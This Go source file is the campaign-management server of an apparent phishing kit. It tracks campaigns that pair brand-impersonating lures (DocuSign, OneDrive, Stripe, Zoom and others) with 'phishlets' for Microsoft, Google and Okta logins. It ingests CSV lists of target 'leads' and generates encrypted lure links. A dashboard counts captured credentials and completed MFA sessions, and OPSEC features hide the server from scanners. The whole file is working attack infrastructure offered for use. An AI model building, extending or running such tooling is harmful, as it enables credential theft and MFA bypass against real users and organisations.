package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"embed"
	"encoding/base64"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

//go:embed templates/*
var templateFS embed.FS

// allowedNets holds parsed CIDRs from ALLOWED_IPS env var for IP-based access control.
var allowedNets []net.IPNet

func main() {
	port := flag.String("port", "9093", "listen port")
	token := flag.String("token", "", "auth token")
	storePath := flag.String("store", "../data/campaigns.json", "path to campaign store file")
	luresPath := flag.String("lures", "../../lures/attachments", "path to lures directory")
	phishletsPath := flag.String("phishlets", "../../proxy-server/phishlets", "path to phishlets directory")
	flag.Parse()

	// OPSEC env vars
	allowedIPs := os.Getenv("ALLOWED_IPS")

	// Parse ALLOWED_IPS into CIDRs for authMiddleware.
	if allowedIPs != "" {
		for _, cidr := range strings.Split(allowedIPs, ",") {
			cidr = strings.TrimSpace(cidr)
			_, n, err := net.ParseCIDR(cidr)
			if err != nil {
				log.Fatalf("FATAL: invalid CIDR in ALLOWED_IPS: %s (%v)", cidr, err)
			}
			allowedNets = append(allowedNets, *n)
			log.Printf("ALLOWED_IPS: granting access to %s", cidr)
		}
	}

	tmpl, err := template.ParseFS(templateFS, "templates/*.html")
	if err != nil {
		log.Fatalf("FATAL: cannot parse templates: %v", err)
	}

	store := NewStore(*storePath)
	lures := scanLures(*luresPath)
	phishlets := scanPhishlets(*phishletsPath)

	log.Printf("Loaded %d lures from %s", len(lures), *luresPath)
	log.Printf("Loaded %d phishlets from %s", len(phishlets), *phishletsPath)

	mux := http.NewServeMux()

	// Page routes
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		campaigns := store.List()
		data := listPageData{
			Campaigns: campaigns,
			Summary:   buildSummary(campaigns),
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		if err := tmpl.ExecuteTemplate(w, "list.html", data); err != nil {
			log.Printf("[ERROR] template list: %v", err)
		}
	})

	mux.HandleFunc("GET /campaigns/new", func(w http.ResponseWriter, r *http.Request) {
		data := newCampaignData{
			Lures:    lures,
			Phishlets: phishlets,
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		if err := tmpl.ExecuteTemplate(w, "new.html", data); err != nil {
			log.Printf("[ERROR] template new: %v", err)
		}
	})

	mux.HandleFunc("GET /campaigns/{id}", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			http.NotFound(w, r)
			return
		}
		data := detailPageData{
			Campaign:  c,
			Lures:     lures,
			Phishlets: phishlets,
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		if err := tmpl.ExecuteTemplate(w, "detail.html", data); err != nil {
			log.Printf("[ERROR] template detail: %v", err)
		}
	})

	// API routes
	mux.HandleFunc("POST /api/campaigns", func(w http.ResponseWriter, r *http.Request) {
		if err := r.ParseForm(); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid form"})
			return
		}
		name := strings.TrimSpace(r.FormValue("name"))
		lure := strings.TrimSpace(r.FormValue("lure"))
		phishlet := strings.TrimSpace(r.FormValue("phishlet"))
		if name == "" || lure == "" || phishlet == "" {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "name, lure, and phishlet are required"})
			return
		}
		c := Campaign{
			ID:        genID(),
			Name:      name,
			Lure:      lure,
			Phishlet:  phishlet,
			Status:    "draft",
			CreatedAt: time.Now().UTC().Format(time.RFC3339),
		}
		store.Put(c)
		log.Printf("Created campaign %s (%s)", c.ID, c.Name)
		http.Redirect(w, r, "/campaigns/"+c.ID, http.StatusSeeOther)
	})

	mux.HandleFunc("POST /api/campaigns/{id}/link", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}
		if err := r.ParseForm(); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid form"})
			return
		}
		redirect := strings.TrimSpace(r.FormValue("redirect"))
		keyB64 := strings.TrimSpace(r.FormValue("key"))
		if keyB64 == "" {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "encryption key is required"})
			return
		}

		// Derive brand from phishlet name
		brand := deriveBrand(c.Phishlet)
		templateName := strings.TrimSuffix(c.Lure, ".html")

		link, err := GenerateLink(keyB64, redirect, c.ID, brand, templateName, "")
		if err != nil {
			log.Printf("[ERROR] generate link: %v", err)
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
			return
		}
		c.Link = link
		c.Status = "active"
		store.Put(c)
		writeJSON(w, http.StatusOK, map[string]string{"link": link})
	})

	mux.HandleFunc("POST /api/campaigns/{id}/verify", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}
		file, _, err := r.FormFile("leads")
		if err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "CSV file upload required (field: leads)"})
			return
		}
		defer file.Close()

		// Save uploaded CSV to disk
		os.MkdirAll("../data/leads", 0755)
		dstPath := fmt.Sprintf("../data/leads/%s.csv", id)
		dst, err := os.Create(dstPath)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to save file"})
			return
		}
		defer dst.Close()
		io.Copy(dst, file)

		// Re-read and count lines
		dst.Seek(0, 0)
		reader := csv.NewReader(dst)
		count := 0
		for {
			_, err := reader.Read()
			if err != nil {
				break
			}
			count++
		}

		c.LeadFile = dstPath
		c.LeadCount = count
		c.Status = "verified"
		store.Put(c)
		writeJSON(w, http.StatusOK, map[string]interface{}{
			"count":  count,
			"file":   dstPath,
			"status": "ok",
		})
	})

	mux.HandleFunc("GET /api/campaigns/{id}/preview", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}
		// Read the lure file content
		lureFile := filepath.Join(*luresPath, c.Lure)
		content, err := os.ReadFile(lureFile)
		if err != nil {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "lure file not found"})
			return
		}
		// Inject the link placeholder into the lure HTML
		preview := strings.Replace(string(content), "##LINK##", c.Link, 1)
		if c.Link == "" {
			preview = strings.Replace(string(content), "##LINK##", "{{LINK_PLACEHOLDER}}", 1)
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(preview))
	})

	mux.HandleFunc("GET /api/events", func(w http.ResponseWriter, r *http.Request) {
		// Proxy analytics data for live stats in the campaign detail view
		eventsData := fetchEventsData()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(eventsData)
	})

	mux.HandleFunc("POST /api/campaigns/{id}/deploy", func(w http.ResponseWriter, r *http.Request) {
		id := r.PathValue("id")
		c, ok := store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, map[string]string{"error": "campaign not found"})
			return
		}
		c.Status = "deployed"
		store.Put(c)
		writeJSON(w, http.StatusOK, map[string]string{"status": "deployed"})
	})

	// Catch-all 404 handler — avoids Go's default fingerprint
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		w.Write([]byte("<html><body></body></html>"))
	})

	addr := ":" + *port
	log.Printf("Campaign Manager listening on http://localhost%s", addr)
	log.Fatal(http.ListenAndServe(addr, authMiddleware(*token, securityHeaders(mux))))
}

// ---------- Campaign Store ----------

// Campaign represents a phishing campaign.
type Campaign struct {
	ID        string `json:"id"`
	Name      string `json:"name"`
	Lure      string `json:"lure"`
	Phishlet  string `json:"phishlet"`
	Link      string `json:"link"`
	LeadFile  string `json:"lead_file"`
	LeadCount int    `json:"lead_count"`
	Status    string `json:"status"`
	CreatedAt string `json:"created_at"`
}

// Store holds campaigns in memory, persisting to a JSON file.
type Store struct {
	mu    sync.RWMutex
	path  string
	items map[string]Campaign
}

func NewStore(path string) *Store {
	s := &Store{path: path, items: make(map[string]Campaign)}
	data, err := os.ReadFile(path)
	if err == nil {
		var campaigns []Campaign
		if json.Unmarshal(data, &campaigns) == nil {
			for _, c := range campaigns {
				s.items[c.ID] = c
			}
			log.Printf("Loaded %d campaigns from %s", len(s.items), path)
		}
	}
	return s
}

func (s *Store) List() []Campaign {
	s.mu.RLock()
	defer s.mu.RUnlock()
	list := make([]Campaign, 0, len(s.items))
	for _, c := range s.items {
		list = append(list, c)
	}
	sort.Slice(list, func(i, j int) bool {
		return list[i].CreatedAt > list[j].CreatedAt
	})
	return list
}

func (s *Store) Get(id string) (Campaign, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	c, ok := s.items[id]
	return c, ok
}

func (s *Store) Put(c Campaign) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.items[c.ID] = c
	s.persist()
}

func (s *Store) persist() {
	list := make([]Campaign, 0, len(s.items))
	for _, c := range s.items {
		list = append(list, c)
	}
	data, err := json.Marshal(list)
	if err != nil {
		log.Printf("[ERROR] marshal store: %v", err)
		return
	}
	os.MkdirAll(filepath.Dir(s.path), 0755)
	if err := os.WriteFile(s.path, data, 0644); err != nil {
		log.Printf("[ERROR] write store: %v", err)
	}
}

// ---------- Lure Scanning ----------

// LureInfo describes a single lure attachment.
type LureInfo struct {
	Filename  string `json:"filename"`
	Brand     string `json:"brand"`
	Icon      string `json:"icon"`
	Category  string `json:"category"`
}

var lureBrands = map[string]LureInfo{
	"adobe-contract.html":   {Filename: "adobe-contract.html", Brand: "Adobe Acrobat Sign", Icon: "A", Category: "document"},
	"docusign-wire.html":    {Filename: "docusign-wire.html", Brand: "DocuSign", Icon: "D", Category: "document"},
	"dropbox-share.html":    {Filename: "dropbox-share.html", Brand: "Dropbox Share", Icon: "B", Category: "file-share"},
	"excel-shared.html":     {Filename: "excel-shared.html", Brand: "Excel Shared", Icon: "X", Category: "document"},
	"gdocs-shared.html":     {Filename: "gdocs-shared.html", Brand: "Google Docs", Icon: "G", Category: "document"},
	"onedrive-file.html":    {Filename: "onedrive-file.html", Brand: "OneDrive", Icon: "O", Category: "file-share"},
	"sharepoint-doc.html":   {Filename: "sharepoint-doc.html", Brand: "SharePoint Document", Icon: "S", Category: "document"},
	"stripe-payment.html":   {Filename: "stripe-payment.html", Brand: "Stripe Payment", Icon: "$", Category: "payment"},
	"teams-recording.html":  {Filename: "teams-recording.html", Brand: "Teams Recording", Icon: "T", Category: "voip"},
	"zoom-recording.html":   {Filename: "zoom-recording.html", Brand: "Zoom Recording", Icon: "Z", Category: "voip"},
}

func scanLures(dir string) []LureInfo {
	var lures []LureInfo
	entries, err := os.ReadDir(dir)
	if err != nil {
		log.Printf("[WARN] cannot read lures dir %s: %v", dir, err)
		// Return built-in lure definitions as fallback
		for _, l := range lureBrands {
			lures = append(lures, l)
		}
		return lures
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".html") {
			continue
		}
		if info, ok := lureBrands[e.Name()]; ok {
			lures = append(lures, info)
		} else {
			// Unknown lure file — derive brand from filename
			name := strings.TrimSuffix(e.Name(), ".html")
			name = strings.ReplaceAll(name, "-", " ")
			name = strings.Title(name)
			lures = append(lures, LureInfo{
				Filename: e.Name(),
				Brand:    name,
				Icon:     strings.ToUpper(name[:1]),
				Category: "other",
			})
		}
	}
	if len(lures) == 0 {
		for _, l := range lureBrands {
			lures = append(lures, l)
		}
	}
	return lures
}

// ---------- Phishlet Scanning ----------

// PhishletInfo describes a single phishlet.
type PhishletInfo struct {
	Name  string `json:"name"`
	Label string `json:"label"`
}

func scanPhishlets(dir string) []PhishletInfo {
	var phishlets []PhishletInfo
	entries, err := os.ReadDir(dir)
	if err != nil {
		log.Printf("[WARN] cannot read phishlets dir %s: %v", dir, err)
		return phishlets
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
			continue
		}
		data, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			continue
		}
		var info struct {
			Name  string `json:"name"`
			Label string `json:"label"`
		}
		if json.Unmarshal(data, &info) == nil && info.Name != "" {
			if info.Label == "" {
				info.Label = info.Name
			}
			phishlets = append(phishlets, PhishletInfo{Name: info.Name, Label: info.Label})
		}
	}
	return phishlets
}

// ---------- Template Data Types ----------

type listSummary struct {
	Active    int
	TotalTargets int
	SuccessRate  string
	LinksGen   int
}

type listPageData struct {
	Campaigns []Campaign
	Summary   listSummary
}

type newCampaignData struct {
	Lures     []LureInfo
	Phishlets []PhishletInfo
}

type detailPageData struct {
	Campaign  Campaign
	Lures     []LureInfo
	Phishlets []PhishletInfo
}

func buildSummary(campaigns []Campaign) listSummary {
	s := listSummary{}
	s.LinksGen = len(campaigns)
	for _, c := range campaigns {
		if c.Status == "active" || c.Status == "deployed" {
			s.Active++
		}
		s.TotalTargets += c.LeadCount
	}
	if s.LinksGen > 0 && s.Active > 0 {
		s.SuccessRate = fmt.Sprintf("%.1f%%", float64(s.Active)/float64(s.LinksGen)*100)
	} else {
		s.SuccessRate = "0.0%"
	}
	return s
}

// ---------- Live Events Data ----------

type eventsSummary struct {
	Total      int    `json:"total"`
	PageLoads  int    `json:"page_loads"`
	Creds      int    `json:"credentials"`
	MFA        int    `json:"mfa_complete"`
	Rate       string `json:"rate"`
	LastCapture string `json:"last_capture"`
}

func fetchEventsData() *eventsSummary {
	dataPath := os.Getenv("EVENTS_PATH")
	if dataPath == "" {
		dataPath = "../data/captures.jsonl"
	}
	f, err := os.Open(dataPath)
	if err != nil {
		return &eventsSummary{Rate: "0", LastCapture: "no data"}
	}
	defer f.Close()

	es := &eventsSummary{}
	decoder := json.NewDecoder(f)
	for decoder.More() {
		var ev struct {
			Timestamp string `json:"timestamp"`
			EventType string `json:"event_type"`
		}
		if err := decoder.Decode(&ev); err != nil {
			continue
		}
		es.Total++
		switch ev.EventType {
		case "page_load":
			es.PageLoads++
		case "credential_submit":
			es.Creds++
		case "mfa_complete":
			es.MFA++
		}
		if ev.Timestamp > es.LastCapture {
			es.LastCapture = ev.Timestamp
		}
	}
	if es.Total > 0 {
		es.Rate = fmt.Sprintf("%.1f%%", float64(es.MFA)/float64(es.PageLoads)*100)
	} else {
		es.Rate = "0.0%"
	}
	if es.LastCapture == "" {
		es.LastCapture = "no data"
	}
	return es
}

// ---------- Link Generation (mirrors core/link.go) ----------

func GenerateLink(keyB64, redirect, campaign, brand, templateName, email string) (string, error) {
	key, err := b64Decode(keyB64)
	if err != nil || len(key) != 32 {
		return "", fmt.Errorf("invalid key: must be base64-encoded 32 bytes (got %d bytes)", len(key))
	}

	if brand == "" {
		brand = "microsoft"
	}
	if templateName == "" {
		templateName = "shared-doc"
	}

	lure := map[string]interface{}{
		"v":  "1",
		"b":  brand,
		"t":  templateName,
		"r":  redirect,
		"c":  campaign,
		"ts": time.Now().Unix(),
	}
	if email != "" {
		lure["e"] = email
	}

	plaintext, err := json.Marshal(lure)
	if err != nil {
		return "", fmt.Errorf("marshal lure: %w", err)
	}

	encrypted, err := encryptAESGCM(plaintext, key)
	if err != nil {
		return "", fmt.Errorf("encrypt: %w", err)
	}

	prefix := make([]byte, 3)
	if _, err := rand.Read(prefix); err != nil {
		return "", fmt.Errorf("random prefix: %w", err)
	}
	full := append(prefix, encrypted...)

	return base64URLEncode(full), nil
}

func deriveBrand(phishlet string) string {
	switch {
	case strings.Contains(phishlet, "microsoft"):
		return "microsoft"
	case strings.Contains(phishlet, "google"):
		return "google"
	case strings.Contains(phishlet, "okta"):
		return "okta"
	default:
		return "microsoft"
	}
}

// ---------- Crypto helpers ----------

func b64Decode(s string) ([]byte, error) {
	enc := base64.StdEncoding
	if strings.ContainsAny(s, "-_") {
		enc = base64.URLEncoding.WithPadding(base64.NoPadding)
	}
	return enc.DecodeString(s)
}

func base64URLEncode(src []byte) string {
	return base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(src)
}

func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// ---------- Utility ----------

func genID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

// ---------- Auth Middleware (same pattern as analytics-server) ----------

func authMiddleware(token string, next http.Handler) http.Handler {
	if token == "" && len(allowedNets) == 0 {
		return next
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// IP check: if ALLOWED_IPS is set, remote IP must match one of the CIDRs.
		if len(allowedNets) > 0 {
			ip := extractIP(r)
			ok := false
			for _, n := range allowedNets {
				if n.Contains(ip) {
					ok = true
					break
				}
			}
			if !ok {
				w.WriteHeader(http.StatusNotFound)
				w.Write([]byte("<html><body></body></html>"))
				return
			}
		}
		// Token check: if a token is configured, one of query/auth header must match.
		if token != "" {
			if r.URL.Query().Get("token") == token {
				next.ServeHTTP(w, r)
				return
			}
			if ah := r.Header.Get("Authorization"); strings.HasPrefix(ah, "Bearer ") {
				if strings.TrimPrefix(ah, "Bearer ") == token {
					next.ServeHTTP(w, r)
					return
				}
			}
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access Denied</title><style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#090c10;color:#59616b;margin:0}.box{text-align:center;padding:40px;border:1px solid #1e2530;border-radius:8px;background:#11161e}.box h1{color:#e8ecf1;font-size:1rem;margin:0 0 8px}.box p{font-size:.8rem;margin:0}.box code{color:#4199f5;background:#091a30;padding:2px 8px;border-radius:4px;font-size:.75rem}</style></head><body><div class="box"><h1>Access Denied</h1><p>Add <code>?token=your-token</code> to the URL</p></div></body></html>`))
			return
		}
		next.ServeHTTP(w, r)
	})
}

func extractIP(r *http.Request) net.IP {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		ips := strings.Split(xff, ",")
		if ip := net.ParseIP(strings.TrimSpace(ips[0])); ip != nil {
			return ip
		}
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return net.ParseIP(r.RemoteAddr)
	}
	return net.ParseIP(host)
}

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}
